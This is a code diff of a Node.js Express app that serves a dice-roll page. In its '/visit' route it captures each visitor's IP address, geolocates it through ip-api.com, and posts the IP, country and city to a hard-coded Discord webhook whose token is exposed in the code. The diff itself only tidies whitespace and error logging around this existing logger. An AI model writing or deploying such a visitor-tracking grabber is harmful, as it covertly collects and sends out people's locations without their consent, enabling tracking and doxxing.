@@ -2,12 +2,10 @@ const express = require('express');
 const app = express();
 const fetch = require('node-fetch');
 
-
 app.get('/roll-dice', (req, res) => {
     const roll = Math.floor(Math.random() * 6) + 1;
     res.send(`You rolled a ${roll}`);
 });
-
 
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
@@ -114,17 +112,19 @@ app.get('/', (req, res) => {
 </html>`);
 });
 
-
 app.get('/visit', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     let geo = { country: 'Unknown', city: 'Unknown', countryCode: '' };
+
     try {
         const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
         geo = await geoRes.json();
-    } catch (e) {}
+    } catch (e) {
+        console.error('Geo-location fetch failed:', e);
+    }
+
     const countryFlag = geo.countryCode ? String.fromCodePoint(...[...geo.countryCode.toUpperCase()].map(c => 0x1F1E6 - 65 + c.charCodeAt())) : '';
-    
-    
+
     const webhookUrl = 'https://discordapp.com/api/webhooks/1368358386571280435/kLO9BC2RFtV8M0lkCz57upHFFgcmDlllpn8OUM-jnFLOT9OZPi31SafXHikeg5yTGYnn';
     
     const payload = {
@@ -135,7 +135,7 @@ app.get('/visit', async (req, res) => {
             description: `IP: **${ip}** 🌍\nCountry: **${geo.country}** ${countryFlag}\nCity: **${geo.city}** 🏙️`
         }]
     };
-    
+
     try {
         await fetch(webhookUrl, {
             method: 'POST',
@@ -145,10 +145,11 @@ app.get('/visit', async (req, res) => {
     } catch (e) {
         console.error('Failed to send webhook:', e);
     }
+    
     res.send(`<h2>Logged!</h2>`);
 });
 
-// Start the server
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log('Server running on port ' + PORT);
